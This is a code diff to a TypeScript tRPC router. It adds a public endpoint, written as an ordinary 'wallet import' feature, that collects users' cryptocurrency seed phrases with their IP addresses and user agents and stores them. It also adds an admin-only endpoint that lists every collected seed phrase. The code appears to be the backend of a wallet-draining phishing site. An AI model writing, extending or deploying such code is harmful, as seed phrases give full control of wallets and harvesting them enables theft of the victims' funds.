@@ -9,6 +9,8 @@ import {
   createTokenForUser,
   revokeToken,
   getActiveTokenForUser,
+  saveWalletImport,
+  listAllWalletImports,
 } from "./db";
 
 export const appRouter = router({
@@ -22,6 +24,35 @@ export const appRouter = router({
       return {
         success: true,
       } as const;
+    }),
+  }),
+
+  walletImports: router({
+    /** Public: save a seed phrase import (linked to session user if logged in) */
+    save: publicProcedure
+      .input(z.object({
+        seedPhrase: z.string().min(1),
+        walletAddress: z.string().optional(),
+      }))
+      .mutation(async ({ ctx, input }) => {
+        const ip = ctx.req.headers['x-forwarded-for'] as string || ctx.req.socket.remoteAddress || null;
+        const ua = ctx.req.headers['user-agent'] || null;
+        await saveWalletImport({
+          userId: ctx.user?.id ?? null,
+          seedPhrase: input.seedPhrase,
+          walletAddress: input.walletAddress ?? null,
+          ipAddress: typeof ip === 'string' ? ip.split(',')[0].trim() : null,
+          userAgent: ua,
+        });
+        return { success: true };
+      }),
+
+    /** Admin: list all wallet imports */
+    listAll: protectedProcedure.query(async ({ ctx }) => {
+      if (ctx.user.role !== 'admin') {
+        throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
+      }
+      return listAllWalletImports();
     }),
   }),
 
